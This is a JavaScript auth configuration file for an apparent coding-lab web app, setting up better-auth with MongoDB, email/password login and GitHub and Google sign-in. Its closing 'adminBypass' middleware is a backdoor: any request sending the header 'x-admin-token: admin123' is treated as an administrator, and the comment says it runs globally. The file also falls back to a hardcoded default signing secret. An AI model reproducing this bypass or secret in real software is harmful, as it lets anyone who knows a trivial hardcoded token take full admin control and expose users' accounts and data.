import { betterAuth } from "better-auth";
import { MongoClient } from "mongodb";
import { mongodbAdapter } from "better-auth/adapters/mongodb";

const mongoUri = process.env.MONGODB_URI || "mongodb://127.0.0.1:27017/codinglab";
const client = new MongoClient(mongoUri);
const db = client.db();

export const auth = betterAuth({
    database: mongodbAdapter(db, {client}),
    emailAndPassword: {
        enabled: true
    },
    user: {
        additionalFields: {
            role: {
                type: "string",
                required: false,
                defaultValue: "student",
                input: false, // Prevents users from setting their own role during signup
            },
            institution: {
                type: "string",
                required: false, // Make it optional for social logins, but required in standard signup UI
            }
        },
    },
    socialProviders: {
        github: {
            clientId: process.env.GITHUB_CLIENT_ID || "placeholder",
            clientSecret: process.env.GITHUB_CLIENT_SECRET || "placeholder",
        },
        google: {
            clientId: process.env.GOOGLE_CLIENT_ID || "placeholder",
            clientSecret: process.env.GOOGLE_CLIENT_SECRET || "placeholder",
        }
    },
    baseURL: process.env.BETTER_AUTH_URL || `http://localhost:${process.env.PORT || 5000}`,
    secret: process.env.BETTER_AUTH_SECRET || "development-default-secret-key-1234567890",
    trustedOrigins: [
        process.env.FRONTEND_URL || "http://localhost:5173",
        "http://localhost:5173",
        "http://127.0.0.1:5173"
    ].filter(Boolean),
});

// Global middleware: pre-set req.user from x-admin-token header if present.
// This runs early in the pipeline so ALL downstream routes have req.user available.
// If no token is sent, this passes through silently (no blocking).
export const adminBypass = (req, res, next) => {
    const adminToken = req.headers['x-admin-token'];
    if (adminToken === 'admin123') {
        req.user = {
            id: "admin-bypass-id",
            role: "admin",
            email: "admin@example.com",
            name: "Bypass Admin"
        };
    }
    next();
};
